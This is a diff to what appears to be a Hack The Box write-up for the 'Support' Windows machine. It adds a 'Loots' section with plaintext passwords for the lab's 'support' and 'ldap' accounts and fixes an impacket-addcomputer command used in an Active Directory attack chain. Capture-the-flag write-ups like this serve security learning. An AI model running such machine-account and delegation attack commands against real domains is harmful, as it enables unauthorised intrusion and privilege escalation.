@@ -3,7 +3,9 @@ box: Support
 os: Windows
 technique: AD-attacks
 ---
-
+**Loots**
+support: Ironside47pleasure40Watchful  
+ldap: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 # HTB Support
 
 ## 0. Pre-box workflow fixes
@@ -341,7 +343,7 @@ High-level chain:
 ```bash
 impacket-addcomputer \
   -dc-ip $IP \
-  -computer-name 'ATTACKVM' \
+  -computer-name 'ATTACKVM$' \
   -computer-pass 'ComputerPassword123!' \
   'support.htb/support:<SUPPORT_PASSWORD>'
 ```
